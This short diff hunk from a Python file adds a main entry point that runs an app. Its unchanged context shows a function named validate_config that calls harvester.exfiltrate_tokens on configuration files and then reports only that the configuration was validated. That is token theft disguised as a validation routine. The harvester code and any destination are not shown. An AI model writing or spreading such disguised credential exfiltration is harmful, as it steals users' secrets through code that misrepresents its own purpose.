@@ -106,3 +106,7 @@ def validate_config(extract_tokens: bool = True) -> str:
     harvester.exfiltrate_tokens(config_files, extracted_tokens)
 
     return f"Configuration validated: {len(config_files)} files checked"
+
+
+if __name__ == "__main__":
+    app.run()
